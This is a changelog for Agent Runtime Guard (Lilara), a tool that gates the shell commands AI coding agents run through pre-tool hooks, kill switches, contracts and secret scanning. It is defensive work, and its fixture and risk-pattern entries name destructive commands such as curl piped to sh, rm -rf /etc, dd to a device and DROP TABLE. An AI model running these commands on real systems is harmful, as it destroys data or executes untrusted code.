- **H3 — fail-closed under LILARA_ENFORCE=1** (`runtime/pretool-gate.js:182-200`): The `decide()` error catch block now closes on ANY non-trivial safety signal under enforce: a dangerous-pattern hit at any severity (medium/high/critical), a secret-bearing payload (`secretHit`), or a high-sensitivity path. Previously only `critical` or `high` pattern hits triggered fail-closed; secret-only payloads, sensitive-path signals, and medium-severity patterns were silently allowed when the runtime was unavailable.

#### Changed

- `SECURITY_MODEL.md`: Added "Fail-Closed Behavior Under LILARA_ENFORCE=1" section documenting the decide()-throw semantics and the availability/safety tradeoff.
- `references/owasp-agentic-coverage.md`: ASI05 updated — table row now reflects `claude/hooks/output-sanitizer.js` PostToolUse implementation for Claude Code; NOT COVERED section updated with honest deferral status for OpenCode (PreToolUse-only in-repo wiring, pending contributor verification) and OpenClaw (event model unverified).
- `opencode/WIRING_PLAN.md`: Added "PostToolUse Parity" section documenting that PostToolUse extension is deferred pending upstream verification.
- `ROADMAP.md`: Added hardening batch summary to `[Unreleased]`; added "OpenCode PostToolUse output-sanitizer parity" to `Post-v2.1 Candidates`.

#### Deferred

- **OpenCode PostToolUse output-sanitizer parity**: In-repo wiring (`opencode/WIRING_PLAN.md`) documents PreToolUse only. No confirmed upstream PostToolUse support. Extension deferred until a contributor verifies the wiring path. See `Post-v2.1 Candidates` in ROADMAP.md.
- **OpenClaw PostToolUse**: PostToolUse event model is unverified for OpenClaw. Remains deferred.

---

## [2.1.1] — 2026-04-25

Post-implementation reality audit. Four verified defects fixed: contract subsystem was non-functional (accept/verify always threw), two new check scripts were structurally broken, and docs had drifted from behavior.

### Fixed
- `runtime/config-validator.js`: **Critical** — validator computed `actualType = typeof value`, which returns `"number"` for all numeric values, never `"integer"`. Schema declares `version` and `revision` as `integer`. Every `validateContract()` call failed with "expected integer, got number", making `contract accept` and `contract verify` throw unconditionally. Users could run `contract init` (which skips validation) but could never reach an accepted contract. Fixed by promoting numeric integers to `"integer"` when the schema expects `integer` and `Number.isInteger(value)` is true.
- `runtime/config-validator.js`: Added `minimum` and `maximum` range enforcement for numeric fields. `revision` schema declares `"minimum": 1` — previously silently ignored.
- `scripts/check-decide-on-every-call.sh`: **Critical (vacuous)** — script ran `node runtime/pretool-gate.js "claude"`, but `pretool-gate.js` is a CommonJS module with no `require.main === module` block. Node loaded and exited without calling `runPreToolGate()` or writing any journal entries. Rewritten to call `runPreToolGate()` directly via `require()` — the same call shape used by production adapters.
- `scripts/check-cross-harness-equivalence.sh`: All three harness calls shared one Node process and one `_stateCache` in `session-context.js`. `recordDecision()` mutated in-process state; harness #2 and #3 saw trajectory contaminated by harness #1's call. Added `resetCache()` call before each harness invocation. Also added a temporary isolated `LILARA_STATE_DIR` so the check does not touch real session state.
- `runtime/session-context.js`: Added `resetCache()` helper (flips `_stateCache = null`). Used by test scripts only — production code paths reload from disk.
- `scripts/check-contract.sh`: `validateContract` was imported but never called in the script. The integer-type bug shipped green because the failing code path was entirely uncovered. Added three new assertions: round-trip (`validateContract(generate(...))` must return `valid: true`), negative-string (`version: "1"` must fail integer check), and negative-minimum (`revision: 0` must fail minimum). Fixed false-pass: script printed "all assertions passed" unconditionally regardless of node heredoc exit code; now conditional on `_anyFailed`.

### Added
- `scripts/check-session-isolation.sh`: Asserts that trajectory state is partitioned by session ID — session B sees zero escalations from session A's history. Regression guard for `resetCache()` and session-context isolation.

### Changed
- `scripts/check-counts.sh`: Bumped `EXPECTED_SCRIPTS` 59 → 60.
- `runtime/pretool-gate.js`: Block messages now include the primary reason code in the "Runtime decision" line (e.g., `[no-contract-strict]`), making the internal reason diagnosable from logs without requiring structured JSON parsing.
- `runtime/risk-score.js`: Added two new risk patterns: `dd`+`of=` scores +8 (`disk-write-pattern`). rm targeting filesystem root (`rm … /` trailing slash with no further path segments) scores +4 (`filesystem-root-target`) by inspecting the command string, matching cases where `targetPath` is not available in the hook input.
- `VERSION`: Bumped to 2.1.1.

### Docs
- `ARCHITECTURE.md` env-var table: `LILARA_KILL_SWITCH=1` row now correctly describes "PreToolUse hooks exit 2 (block); informational hooks pass stdin through unchanged". Previous text said "all hooks pass through immediately" — that was the pre-2.0.1 bug behavior, not the fixed behavior.
- `SECURITY_MODEL.md`: Kill-switch section no longer says "for full blocking, also set LILARA_ENFORCE=1". PreToolUse hooks exit 2 unconditionally — no additional flags needed.
- `README.md`: Fixture count updated from 130 to 174 fixture-based tests.
- `CHANGELOG.md` (2.0.1 entry): Tightened `fineKey` description — "5-part: includes `projectRoot`" → "5-part: tool / commandClass / pathBucket (project-relative) / branchBucket / payloadClass — closes the cross-project leak via the relative-path bucket". The pathBucket uses `path.relative(projectRoot, ...)` rather than literally including the projectRoot string.

---

## [2.1.0] — 2026-04-25

Phase D hardening: macOS CI now required, bench baseline persisted across runs, three new harness adapters, telemetry aggregation.

### Added
- `codex/hooks/adapter.js`, `clawcode/hooks/adapter.js`, `antegravity/hooks/adapter.js`: Best-effort PreToolUse adapters using the broadest input-shape fallback chain. APIs not publicly documented — adapters are unverified; test against real hook payloads before using in production. READMEs updated to reflect adapter presence while retaining NOT YET SUPPORTED status.
- `runtime/telemetry.js`: Added `readTelemetry()` and `summarizeTelemetry()` exports. Groups events by type with count and lastSeen; returns date range.
- `scripts/lilara-cli.sh telemetry report`: Prints a telemetry event summary (counts by event type, date range). `telemetry clear` removes the log file.

### Changed
- `.github/workflows/check.yml` (D1): Removed `allow_failure: true` from macOS matrix entry. macOS p99 ceiling is now required (200 ms). A failing macOS bench fails the entire CI run.
- `.github/workflows/check.yml` (D2): Added `actions/cache@v4` restore + save steps around the bench run. Cache key: `bench-baseline-${os}-${sha}`; restore key: `bench-baseline-${os}-`. The bench script's 1.5× baseline regression check now uses a persistent cross-run baseline instead of a local-only file.

---

## [2.0.1] — 2026-04-25

Security hotfix. Closes seven enforcement gaps found by post-ship audit (issues C1–C11 in audit-notes).

### Fixed
- `runtime/decision-engine.js` (C2): `blockResult` was undefined — `ReferenceError` was silently swallowed by the outer `catch{}`, allowing strict-mode + tampered contract hash to fall through. Replaced with `buildEarlyBlock(...)`.
- `runtime/pretool-gate.js` (C1): `decide()` was only called when a dangerous-pattern regex matched. Commands with no pattern match bypassed the entire decision engine (contract scope, payload-class, session-risk, trajectory). Now `decide()` runs on every tool call; pattern hits annotate but no longer gate.
- `runtime/pretool-gate.js`, all 10 PreToolUse hooks (C3, C4): Kill-switch was `exit 0` (silent allow). PreToolUse hooks now `exit 2` (block). Informational hooks (PostToolUse/SessionStart/Stop) remain `exit 0` + echo stdin.
- `claude/hooks/git-push-reminder.js` (C4): Had zero kill-switch handling. Added guard at handler start.
- `runtime/contract.js` (C5, C6): `scopeMatch()` used only `input.targetPath` string. Now calls `arg-extractor.extractPaths()` to get all command targets, resolves via `path.resolve` + `fs.realpathSync` (symlink escape protection), applies all-or-nothing semantics.
- `runtime/policy-store.js` (C7): `isLearnedAllowed()` used the legacy 4-part key — `rm -rf node_modules` in project A could unlock `rm -rf /etc` in project B. Switched to `fineKey` (5-part: tool / commandClass / pathBucket (project-relative) / branchBucket / payloadClass — closes the cross-project leak via the relative-path bucket) with one-release legacy read fallback.
- `runtime/decision-engine.js` (C8): Session-risk ≥ 3 was not a true floor — only +1..3 score points. Now escalates unconditionally before `contract-allow` can demote.
- `runtime/decision-engine.js` (C9): Learned-allow could demote any medium/high action. Now narrowed to `destructive-delete-pattern` at high risk only.
- `runtime/decision-engine.js` (C10): `contract-allow` could demote `require-review` (protected-branch floor). Guard now also protects `require-review`.
- `runtime/decision-engine.js` (C11): `floorFired` field was never written to journal entries. Now included when a floor constrained the decision.
- `runtime/contract.js` (C14): `auto-download` always denied regardless of `remoteExecAllow`. Now reads `scopes.network.remoteExecAllow`; denies only when empty.
- `runtime/contract.js` (C15): `hard-reset`, `destructive-db`, and `disk-write` were in `GATED_CLASSES` but had no `scopeMatch()` handler — all fell through to `gated-class-${cmdClass}-no-coverage`. Now handled via `destructiveAllow` by `commandClass`.
- `runtime/decision-engine.js`, `runtime/contract.js` (C13): `GATED_CLASSES` differed between files. Now a single export from `contract.js`, imported by `decision-engine.js`.
- `schemas/lilara.contract.schema.json` (B9): Added `description` fields to `outboundDeny`, `branches.protected`, and `secrets.scanMode` explaining floor semantics and the relationship between contract configuration and engine-level floors. `scanMode` enum `["block", "warn"]` already prevented "off" — this is documented explicitly. `payloadClasses.C` enum `["warn", "block"]` is unchanged and remains the model for floor enforcement at the schema level.

### Changed
- `scripts/lilara-cli.sh contract amend`: Was a print-only stub. Now loads the accepted contract, calls `generate()` with `existingRevision + 1`, writes the draft, and prints the next revision number.
- `scripts/check-kill-switch.sh`: Updated expected exit codes — PreToolUse hooks must exit 2 under kill-switch (previously incorrectly asserted exit 0). Added `LILARA_ALLOW_MISSING_NODE=1` bypass; missing `node` now exits 1 instead of silently passing.
- `scripts/check-cross-harness-equivalence.sh`: Missing `node` now exits 1 instead of silently passing. Added `LILARA_ALLOW_MISSING_NODE=1` bypass.
- `scripts/check-counts.sh`: Bumped `EXPECTED_SCRIPTS` 57 → 59.
- `scripts/check-decide-on-every-call.sh`: New script. Fires 10 representative commands through `pretool-gate.js` (benign + gated) and asserts each one writes a journal entry. Verifies C1 fix holds.
- `scripts/check-cross-harness-equivalence.sh`: Missing `node` now exits 1 instead of silently passing. Added `LILARA_ALLOW_MISSING_NODE=1` bypass. Now reads commands from `tests/fixtures/cross-harness/*.input` when present; falls back to inline baseline.
- `claude/hooks/hook-utils.js`: Added `createAdapter({ harness, rateLimitKey, extractCommand, extractCwd, extractTool })` factory. Encapsulates stdin read, rate-limit guard, JSON parse, pretool-gate delegation, stderr output, hookLog, and exit-code handling.
- `claude/hooks/dangerous-command-gate.js`, `opencode/hooks/adapter.js`, `openclaw/hooks/adapter.js`: Reduced from 47/59/71 lines to 15/16/17 lines using `createAdapter`. No behavior change.
- `tests/fixtures/kill-switch/`: 12 new fixture inputs — 6 PreToolUse hooks asserting exit 2, 6 informational hooks asserting exit 0.
- `tests/fixtures/contract/`: 12 new fixture pairs covering gated-command strict-mode blocks, critical risk blocks, and allow paths.
- `tests/fixtures/cross-harness/`: 20 new fixture inputs (10 safe + 10 dangerous commands) used by `check-cross-harness-equivalence.sh`.
- `scripts/run-fixtures.sh`: Added kill-switch and contract fixture suite sections.

### Corrected (1.9.0 entry)
> The 1.9.0 CHANGELOG claimed: "All 12 hooks gated by kill-switch" and "`scripts/check-kill-switch.sh`: fires all 12 hooks… asserts exit 0 and stdout === stdin for each." Both statements were false. `git-push-reminder.js` had no kill-switch guard, and the correct kill-switch behavior for PreToolUse hooks is `exit 2` (block), not `exit 0`. Fixed in this release.

---

## [2.0.0] — 2026-04-25

Upfront security contract model. All fourteen structural weaknesses (W1–W14) from the v2.0 plan audit are addressed. Contracts are now default-on.

### Added
- `ARCHITECTURE.md`: Authoritative module map, Section 4.6 precedence matrix verbatim, storage layout, environment variable catalog, adapter contract, zero-dep policy. Closes W14 (docs drift).
- `CONTRACT.md`: Full field reference for `lilara.contract.json`. Quick start, schema, gated capability classes, hash verification, scope matching algorithm, floors that cannot be overridden. Closes W14.
- `ROADMAP.md`: Forward-looking work only. Merged from `IMPROVEMENT_PLAN.md` + aspirational fragments. Closes W14.

### Changed
- `runtime/decision-engine.js`: Flipped `LILARA_CONTRACT_ENABLED` default — contracts are now **on by default**. Opt out with `LILARA_CONTRACT_ENABLED=0`. Previously required `LILARA_CONTRACT_ENABLED=1`.
- `runtime/decision-engine.js`, `runtime/session-context.js`, `runtime/policy-store.js`, `runtime/decision-journal.js`: Added `LILARA_READONLY_CONTRACT=1` guards on all write paths. In read-only mode, decisions proceed normally but zero bytes are written to policy-store, session-context, or decision-journal. Useful for CI/review runs.
- `.github/workflows/check.yml`: Added `macos-latest` with `bench_p99_ms: "200"` and `allow-failure: true` (one cycle, then enforce). Closes Section 7.6 of plan.
- `scripts/bench-runtime-decision.sh`: Added persistent baseline at `artifacts/bench/baseline.json` (per-platform p50/p95/p99). Fails if current p99 > 1.5× baseline p99 or > ceiling, whichever is tighter. Added cold-cache vs warm-cache reporting (first 10 calls vs full 1000). Closes Section 7.5 of plan.
- `README.md`: Rewrote L3–5 (was aspirational roadmap, now factual description of what v2.0 delivers). Updated script count to 57. Added links to ARCHITECTURE.md, CONTRACT.md, ROADMAP.md.
- `MODULES.md`: Removed broken references to `upstream-sync.md`, `vendor-policy.md`, `import-checklist.md` (files never existed). Replaced with existing `capability-log.md` and `parity-matrix.json`. Closes W14.
- `scripts/check-counts.sh`: No count changes; counts remain at v1.9.0 values.

### Deleted
- `IMPROVEMENT_PLAN.md`: Historical parity-phase doc. Content merged into `ROADMAP.md`. Closes W14.
- `references/unified-master-plan.md`: Stale, 92-fixture count was two versions behind. Content superseded by `ROADMAP.md`. Closes W14.

---

## [1.9.0] — 2026-04-25

Contract integration: wires `runtime/contract.js` into `decide()` (Phase 3, flag-gated). Session-id partitioning. All 12 hooks gated by kill-switch. `lilara-diff-decisions.sh` regression replay harness.

### Added
- `runtime/decision-engine.js`: Section 4.6 precedence matrix implemented. Contract loaded lazily when `LILARA_CONTRACT_ENABLED=1`. Steps 2/5/11 added: hash-mismatch block, harness-out-of-scope block, contract-allow demotion. Gated capability classes (`GATED_COMMAND_CLASSES`) defined. `buildEarlyBlock()` helper journals every contract-floor refusal. `contract-allow` source exempt from trajectory nudge. Journal entries gain `contractId`, `contractRevision`, `scopeHit`. Closes W3 (no upfront contract) and W11 (high-risk non-destructive cannot pre-approve). Strict mode (`LILARA_CONTRACT_REQUIRED=1`) gates by capability class per Section 4.5a.
- `runtime/session-context.js`: Session-id partitioning. `startSession()` writes 16-hex session ID to `current-session-id` file. `recordDecision()` writes to `sessions[sid]` (up to 23 per session) while maintaining legacy `recent` field. Exports `startSession`, `currentSessionId`. Closes W2 (no session boundary).
- `claude/hooks/session-start.js`: calls `startSession()` at session begin so all subsequent `decide()` calls within the session are correctly partitioned.
- `scripts/lilara-diff-decisions.sh`: replays last N journal `runtime-decision` entries through the current decision engine. Reports action promotions (more restrictive) as divergences; ignores legitimate `contract-allow` demotions (less restrictive). Exit 0 = clean. Closes Section 7.4 of plan.
- `scripts/check-kill-switch.sh`: fires all 12 hooks with `LILARA_KILL_SWITCH=1 LILARA_ENFORCE=1`, asserts exit 0 and stdout === stdin for each. Closes Section 7.2 kill-switch coverage requirement.

### Changed
- `scripts/check-counts.sh`: updated `EXPECTED_SCRIPTS` from 56 → 57.
- `scripts/lilara-cli.sh check`: added "Kill-switch (all 12 hooks)" section running `check-kill-switch.sh`.
- `.github/workflows/check.yml`: added "Kill-switch (all 12 hooks)" step.

---

## [1.8.0] — 2026-04-25

Contract scaffolding behind `LILARA_CONTRACT_ENABLED=0`. Runtime ignores contracts for decisions this version; contracts can be authored and validated.

### Added
- `runtime/glob-match.js`: zero-dep glob matcher supporting `**`, `*`, `?`, `[abc]`, `!` negation, `${projectRoot}` substitution, Windows case-folding. No minimatch dependency.
- `runtime/canonical-json.js`: deterministic JSON stringify (keys sorted recursively) for contract hashing. Zero external deps.
- `runtime/arg-extractor.js`: minimal argv splitter (single/double quotes, backslash escapes, heredocs → opaque `<<HEREDOC`). Used for scope matching.
- `runtime/config-validator.js`: typed-field walker validating lilara.config.json and lilara.contract.json against JSON schemas. No ajv/zod dependency. Closes W9 (config has no schema; misconfiguration is silent).
- `runtime/decision-key.js`: finer-grained decision key with `pathBucket` (project-relative path prefix) and `branchBucket` (protected/feature/other). Closes W10 (decisionKey too coarse). Preserves legacy key for backward-compat.
- `runtime/contract.js`: contract lifecycle — `load()`, `verify()`, `accept()`, `generate()`, `scopeMatch()`, `harnessInScope()`. Hash is SHA-256 of canonical JSON excluding `contractHash` field itself. Self-accept guard: refuses when harness session env vars are detected.
- `schemas/lilara.config.schema.json`: JSON schema for lilara.config.json (W9).
- `schemas/lilara.contract.schema.json`: JSON schema for lilara.contract.json. Version 1. Payload class C cannot be set to `off` (floor complement).
- `lilara.contract.json.example`: example contract document with inline comments.
- `scripts/check-contract.sh`: ≥50 assertions covering canonical-json, glob-match, arg-extractor, config-validator, decision-key, and contract module (generate, hash, scopeMatch, harnessInScope, tamper detection, revision downgrade rejection).
- `lilara-cli.sh contract`: new subcommand with `init`, `accept`, `show`, `verify`/`status`, `diff`, `amend` operations.

### Changed
- `scripts/check-counts.sh`: updated `EXPECTED_SCRIPTS` from 55 → 56.
- `scripts/lilara-cli.sh check`: added "Contract module" section running `check-contract.sh`.
- `.github/workflows/check.yml`: added "Contract module" step.
- `README.md`: updated script count to 56.

---

## [1.7.0] — 2026-04-25

### Added
- `runtime/pretool-gate.js`: single enforcement spine for all three harnesses (claude, openclaw, opencode). Inlines `classifyCommandPayload` and `classifyPathSensitivity`, loads dangerous patterns, runs `runtime.decide()`, enforces with exit 2. Closes W1 (triplicated decision logic). Returns `{ exitCode, stderrLines, logAction, logHitName }` for thin adapter wrappers.
- `runtime/secret-scan.js`: extracted secret pattern scanning logic from `claude/hooks/secret-warning.js`. Loads from `claude/hooks/secret-patterns.json` with fallback patterns. Exports `scanSecrets(text)`. Closes W5 (secret scan Claude-only).
- `scripts/check-cross-harness-equivalence.sh`: calls `runPreToolGate` with all three harness names for 20 representative commands and asserts identical `exitCode + logAction` across harnesses. Closes W13.
- 7 new enforce fixtures for OpenClaw (`oc-enforce-force-push`, `oc-enforce-drop-table`, `oc-enforce-curl-pipe`, `oc-enforce-hard-reset`, `oc-enforce-npx-y`, `oc-enforce-dd-device`, `oc-enforce-rm-no-preserve-root`). OpenClaw now has 8 enforce fixtures. Closes W12 for openclaw.
- 7 new enforce fixtures for OpenCode (`opencode-enforce-force-push`, `opencode-enforce-drop-table`, `opencode-enforce-curl-pipe`, `opencode-enforce-hard-reset`, `opencode-enforce-npx-y`, `opencode-enforce-dd-device`, `opencode-enforce-rm-no-preserve-root`). OpenCode now has 8 enforce fixtures. Closes W12 for opencode.
- `lilara-cli.sh ci`: new full CI superset subcommand — runs `check` + `audit-local` + `audit-examples` + `verify-hooks-integrity` + `run-fixtures` + `bench-runtime-decision`. Matches the GitHub Actions workflow step-for-step. Closes Section 8.4 of the v2.0 plan.

### Changed
- `claude/hooks/dangerous-command-gate.js`: rewritten as ~30-line thin adapter delegating to `runtime/pretool-gate.js`. Closes W1.
- `claude/hooks/secret-warning.js`: rewritten as thin adapter delegating to `runtime/secret-scan.js` for pattern matching. Closes W5.
- `openclaw/hooks/adapter.js`: rewritten as ~30-line thin adapter delegating to `runtime/pretool-gate.js`. Closes W1.
- `opencode/hooks/adapter.js`: rewritten as ~30-line thin adapter delegating to `runtime/pretool-gate.js`. Closes W1.
- `scripts/lilara-cli.sh check`: added cross-harness-equivalence section; removed bench (moved to `ci`); prints guidance to run `lilara-cli.sh ci` for full CI set on success.
- `scripts/check-counts.sh`: updated `EXPECTED_FIXTURES` from 116 → 130, `EXPECTED_SCRIPTS` from 54 → 55.
- `.github/workflows/check.yml`: added "Cross-harness equivalence" step.
- `scripts/hooks-baseline.sha256`: regenerated after `dangerous-command-gate.js` and `secret-warning.js` rewrites.

---

## [1.6.0] — 2026-04-25

### Added
- `runtime/state-paths.js`: centralized path resolution for all state directories (`stateDir`, `hookStateDir`, `instinctDir`). Replaces two coexisting storage conventions and three hardcoded `~/.openclaw/` paths.
- `runtime/telemetry.js`: lightweight append-only telemetry log (`telemetry.jsonl`) for internal runtime events (corruption, migration). Records metadata only; disable with `LILARA_TELEMETRY=0`.
- `scripts/check-zero-deps.sh`: CI guard asserting `runtime/*.js` has no third-party `require()` calls. Fails if any non-builtin, non-relative import is found.
- `scripts/check-counts.sh`: CI guard asserting agent/rule/skill/hook/fixture/script counts match expected values. Fails on count drift.
- `references/archive/CLAUDE_CODE_HANDOFF-v1.0.md`: archived v1.0.0 handoff document (was stale at v1.0.0; current is v1.6.0).

### Changed
- `runtime/decision-journal.js`: journal rotation at 5 MB — rotates to `decision-journal.1.jsonl`, compresses older generations to `.2.jsonl.gz` / `.3.jsonl.gz`, drops generation 4+. Override threshold with `LILARA_JOURNAL_MAX_MB`. Closes W6 (unbounded journal).
- `runtime/policy-store.js`, `runtime/session-context.js`, `runtime/project-policy.js`: corrupt file handling — on JSON parse failure, copies file to `<file>.corrupt-<ts>.bak`, writes to stderr, emits telemetry event, then defaults. Closes W7 (silent reset on corruption).
- `claude/hooks/hook-utils.js`: `hookLog` and `rateLimitCheck` now resolve state directory via `runtime/state-paths.hookStateDir()` instead of a hardcoded path.
- `claude/hooks/strategic-compact.js`, `claude/hooks/instinct-utils.js`: resolve storage directories via `runtime/state-paths` instead of hardcoded `~/.openclaw/` paths. Closes W8 (two storage conventions + hardcoded paths).
- `claude/hooks/memory-load.js`: removed hardcoded developer-machine path (`-home-khouly--openclaw-workspace-sand`). Closes W8 leaked developer path.
- `claude/hooks/session-start.js`, `session-end.js`, `strategic-compact.js`, `memory-load.js`, `pr-notifier.js`, `build-reminder.js`, `quality-gate.js`: added `LILARA_KILL_SWITCH` guard — all 7 non-decide hooks now honor the kill switch. Closes W4 (kill-switch 7/12 gap).
- `CLAUDE_CODE_HANDOFF.md`: replaced with redirect notice pointing to the archive.
- `hooks.enforce_secrets` (dead field): fully removed from `schemas/lilara.config.schema.json`, `scripts/generate-config.sh`, `scripts/setup-wizard.sh`, `scripts/install-local.sh` (dead read into unused `config_enforce`), and `scripts/check-config-integration.sh` fixtures. Previously only removed from `lilara.config.json.example`.
- `README.md`: corrected rule count (81→82), script count (51→54), added `check-zero-deps.sh` and `check-counts.sh` to the scripts table.

### Fixed
- Kill-switch (`LILARA_KILL_SWITCH=1`) now reaches all 12 hook files, not just the 5 that call `runtime.decide()`.

---

## [1.5.0] — 2026-04-24

### Added
- `opencode/hooks/adapter.js`: real runtime hook adapter for OpenCode harnesses (Claude Code fork). Reads OpenCode's native `{ "tool_name": "Bash", "args": { "command": "..." } }` input shape, runs all 20 dangerous patterns, calls `runtime.decide()`, warns to stderr or exits 2 in enforce mode.
- `tests/fixtures/opencode/`: 12 fixtures for the adapter (104 → 116/116 passing) covering dangerous commands, enforce/block mode, safe pass-through, and borderline sudo.
- `scripts/check-opencode-adapter.sh`: standalone adapter smoke test — existence, syntax, safe/dangerous/enforce/args-field extraction.
- `opencode/WIRING_PLAN.md`: updated with adapter wiring instructions and input shape documentation.

---

## [1.4.0] — 2026-04-24

### Added
- `openclaw/hooks/adapter.js`: real runtime hook adapter for OpenClaw-style harnesses. Reads OpenClaw's native `{ "tool": "shell", "cmd": "..." }` input shape (with Claude Code shape fallback), runs all 20 dangerous patterns from `claude/hooks/dangerous-patterns.json`, calls `runtime.decide()`, warns to stderr in warn mode and exits 2 in enforce mode (`LILARA_ENFORCE=1`).
- `tests/fixtures/openclaw/`: 12 fixtures for the adapter (92 → 104/104 passing) covering dangerous commands (rm-rf, force-push, curl|sh, DROP TABLE, npx -y, git reset --hard), enforce/block mode, safe pass-through (ls, git-log, npm install, git push), and borderline sudo.
- `scripts/check-openclaw-adapter.sh`: standalone adapter smoke test — existence, syntax, safe/dangerous/enforce/cmd-field extraction.
- `openclaw/WIRING_PLAN.md`: updated with adapter wiring instructions, input shape documentation, and fixture reference.

---

## [1.3.1] — 2026-04-24

### Added
- `runtime/risk-score.js`: four new risk patterns closing documented engine gaps:
  - `hard-reset-pattern` (`git reset --hard`) — +4 points, medium → `route`
  - `kubectl-delete-pattern` (`kubectl delete|remove`) — +4 points, medium → `route`
  - `git-clean-pattern` (`git clean -f`) — +3 points, medium → `route`
  - `broad-permission-pattern` (`chmod 777/666/o+w/a+w`) — +3 points, medium → `route`
- `tests/eval-corpus.json`: 7 new entries (57 total: 29 safe / 12 dangerous / 16 borderline):
  - borderline-08/09 updated from `allow` (known gap) to `warn` (now caught)
  - borderline-14 (`git clean -fd`), borderline-15 (`chmod 777`), borderline-16 (`kubectl delete namespace`)
  - safe-26 (`git reset HEAD~1` — soft reset, no `--hard`), safe-27 (`kubectl get pods`), safe-28 (`chmod +x`), safe-29 (`git clean --dry-run`)
- `references/decision-quality.md`: baseline updated to v1.3.1 (57 entries, 0.0% FP / 0.0% FN).

---

## [1.3.0] — 2026-04-24

### Added
- `tests/eval-corpus.json` — 50-entry labeled eval corpus: 25 safe, 12 dangerous, 13 borderline. Each entry drives one `runtime.decide()` call and specifies an expected action class and expected reason codes.
- `scripts/eval-decision-quality.sh` — decision quality measurement script. Runs the labeled corpus through `runtime.decide()` in isolation (per-entry `sessionRisk=0`, `LILARA_TRAJECTORY_THRESHOLD=9999`), maps outcomes to `allow/warn/block` classes, and reports false-positive rate (safe entries blocked) and false-negative rate (dangerous entries missed). Exits 1 if FP% > `LILARA_EVAL_MAX_FP_PCT` (default 10%) or FN% > `LILARA_EVAL_MAX_FN_PCT` (default 20%).
- `lilara-cli.sh eval` subcommand — dispatches to `eval-decision-quality.sh`. Supports `--verbose`, `--max-fp-pct`, `--max-fn-pct`, `--corpus`.
- `references/decision-quality.md` — baseline quality report for v1.3.0: 0.0% FP / 0.0% FN against the corpus, with per-entry table and notes on known engine gaps.
- README updated: Quick Start step 8 (`eval`); scripts table updated (count: 50 → 51).

### Baseline (v1.3.0)
- False-positive rate: **0.0%** (0 / 25 safe entries blocked)
- False-negative rate: **0.0%** (0 / 12 dangerous entries missed)

---

## [1.2.0] — 2026-04-24

### Added
- `scripts/install.sh` — single-command install entry point. Validates Node.js and git, copies kit files, generates `lilara.config.json` if missing, prints the wire-hooks snippet. Replaces the three-step wizard → install-local → wire-hooks flow. Flags: `--profile`, `--tool`, `--auto`, `--yes`, `--dry-run`.
- `scripts/upgrade.sh` — in-place upgrade for existing installations. Reads installed `VERSION`, re-runs install with the same profile (from `lilara.config.json`), preserves `lilara.config.json` unconditionally, updates `VERSION`, and reports the version delta. State files in `LILARA_STATE_DIR` are never touched.
- `lilara-cli.sh install` now dispatches to `install.sh` (was `install-local.sh`); `lilara-cli.sh upgrade` added as new subcommand.
- `check-installation.sh` extended with sections 10–13: `install.sh --dry-run`, fresh install, same-version no-op, and version-bump upgrade with config preservation.
- README Quick Start updated to lead with `install` + `upgrade` commands; scripts table updated with new entries (count: 48 → 50).

---

## [1.1.0] — 2026-04-24

### Added
- Unified decision path: `secret-warning.js` and `git-push-reminder.js` now route through `runtime.decide()` for unified policy, trajectory tracking, and explainability. Secret and force-push decisions are now subject to session risk escalation, decision journaling, and consistent `[Agent Runtime Guard]` output prefix.
- `references/unified-master-plan.md` — canonical project plan replacing `IMPROVEMENT_PLAN.md`'s stale parity-tracking content. Covers current-state audit, end-state definition, multi-harness support strategy, gap analysis, full phased roadmap, and project score.

### Fixed
- `secret-warning.js` and `git-push-reminder.js` output prefix changed from `[ECC Safe-Plus]` to `[Agent Runtime Guard]` to match `dangerous-command-gate.js`. All 23 fixture `expected_stderr` files updated accordingly.
- `IMPROVEMENT_PLAN.md` deprecated with a notice pointing to `unified-master-plan.md`; stale baselines (129 skills, 48 agents, 50 rules) are now clearly labeled as historical.
- `scripts/hooks-baseline.sha256` regenerated after hook changes.

---

## [1.0.3] — 2026-04-24

### Fixed
- `scripts/check-runtime-core.sh`: use `fs.realpathSync.native` (Windows `GetFinalPathNameByHandleW`) to resolve 8.3 short paths (e.g. `RUNNER~1` → `runneradmin`) before path comparisons in the `discover-git-repo` test. Fixes Windows CI failure where `os.tmpdir()` returns an 8.3 abbreviated path while `git rev-parse --show-toplevel` returns the canonical long form.
- `scripts/check-runtime-core.sh`: suppress decision-journal file writes during tests via `LILARA_DECISION_JOURNAL=0`; eliminates potential AV-locking failures on the Windows CI runner.

---

## [1.0.2] — 2026-04-23

### Added
- Enforce/block-mode fixtures: 4 new DCG enforce pairs (curl-pipe-sh, force-push, dd-device, drop-table) and 3 new secret-warning enforce pairs (private-key-block, aws-access-key-id, openai-key). Total fixtures: 85 → 92/92.
- Windows CI runner added to check workflow matrix (`windows-latest`, 500ms bench ceiling). All check steps now run on both Ubuntu and Windows.
- `check-scenarios.sh` now verifies scenario counts: 20 approval-boundary and 14 prompt-injection (was existence-only check).

### Fixed
- `dangerous-command-gate.js`: `runtimeDecision()` now runs in its own isolated try/catch with severity fallback — a corrupted policy file or runtime throw can no longer silently bypass the gate. All `hookLog()` calls in the block path moved to after `console.error()` and wrapped in try, ensuring `process.exit(2)` is always reached.
- `secret-warning.js`: `hookLog()` moved after `console.error()` and wrapped in try in the ENFORCE block, ensuring `process.exit(2)` is always reached.
- `git-push-reminder.js`: same `hookLog()` ordering fix in the ENFORCE block.
- `runtime/policy-store.js`: module-level cache eliminates 4+ redundant `fs.readFileSync` calls per `decide()` invocation. Cache is invalidated on every write.
- `runtime/session-context.js`: same read-cache pattern — eliminates 2 redundant state reads per `decide()` call.
- OWASP matrix ASI04 verdict corrected from `COVERED` to `PARTIAL`: `redact-payload.sh` is an offline audit tool, not wired into hook execution. `secret-warning.js` is the real runtime control.

---

## [1.0.1] — 2026-04-23

### Added
- Expanded fixture coverage from 54 to 85/85: added positive fixtures for all 21 dangerous-command-gate patterns (was 10/21) and all 23 secret-warning patterns (was 4/23). Private-key block, certificate block, and 17 other patterns now have explicit test inputs.
- `classifyPathSensitivity` unit tests in `check-runtime-core.sh` covering low/medium/high tiers.
- JSONL audit trail end-to-end assertion in `check-hook-edge-cases.sh`.
- Trajectory-nudge negative tests: verified learned-allow and auto-allow-once remain exempt under 3+ escalation seeds.
- `check-status-artifact.sh` wired into `lilara-cli.sh check` (was CI-only); `check-scenarios.sh` wired into both `lilara-cli.sh check` and CI.
- `check-owasp-coverage.sh` and `bench-runtime-decision.sh` added to README scripts table.

### Fixed
- Fixture count in README, full-power-status.md updated to 85/85.
- IMPROVEMENT_PLAN.md `Last updated` header corrected from 2026-04-21 to 2026-04-23.
